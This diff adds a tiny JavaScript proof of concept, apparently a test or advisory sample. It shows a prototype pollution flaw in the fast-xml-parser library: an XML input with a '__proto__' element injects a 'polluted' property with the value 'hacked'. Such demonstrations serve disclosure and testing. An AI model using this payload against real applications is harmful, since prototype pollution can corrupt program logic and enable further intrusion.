@@ -1,0 +1,8 @@
+const { XMLParser, XMLBuilder, XMLValidator} = require("fast-xml-parser");
+
+let XMLdata = "<__proto__><polluted>hacked</polluted></__proto__>"
+
+const parser = new XMLParser();
+let jObj = parser.parse(XMLdata);
+
+console.log(jObj.polluted) // should return hacked
